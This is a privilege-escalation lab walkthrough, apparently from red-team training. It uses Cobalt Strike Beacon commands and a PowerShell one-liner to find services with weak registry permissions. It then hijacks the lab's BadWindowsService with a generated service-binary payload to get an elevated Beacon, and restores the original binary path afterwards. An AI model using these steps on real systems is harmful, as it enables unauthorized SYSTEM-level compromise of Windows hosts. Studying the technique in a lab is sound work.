# Privilege Escalation Lab  

>The objective of this lab is to exploit weak registry permissions on a service for privilege escalation.

===

# Enumeration

1. Launch Cobalt Strike and connect to the team server.
1. Interact with the Beacon running as pchilds.
2. Change the spawnto to msedge.

    ```beacon-nocolor
    spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
    ```

1. Use PowerShell to search for services where low-priv users have FullControl rights.

    ```beacon-nocolor
    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}
    ```

⚠️ This should return BadWindowsService.

===

## Exploitation

1. Set the spawnto for the service binary payload.
    1. `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe`

1. Generate a service binary payload.
    1. **Payloads > Windows Stageless Payload**.
    2. Listener: **http**
    3. Output: **Windows Service EXE**
    4. Click **Generate**
    5. Save to *C:\Payloads\http_x64.svc.exe*

1. Stop the service.
  1. `sc_stop BadWindowsService`

1. Change Beacon's current working directory.
  1. `cd C:\Temp`
    
1. Upload the payload to disk.
  1. `upload C:\Payloads\http_x64.svc.exe`

1. Get the service's current binary path.
  1. `sc_qc BadWindowsService`

1. Reconfigure the service to point to the payload.
  1. `sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2`

1. Start the service.
  1. `sc_start BadWindowsService`

⚠️ The elevated Beacon should appear within a few seconds.

1. Restore the service's binary path.

    ```beacon-nocolor
    sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
    ```

1. Delete the service payload.
  1. `rm http_x64.svc.exe`

1. Start the service again.
    1. `sc_start BadWindowsService`

⚠️ In this lab, you have abused a weak service permission for privilege escalation.
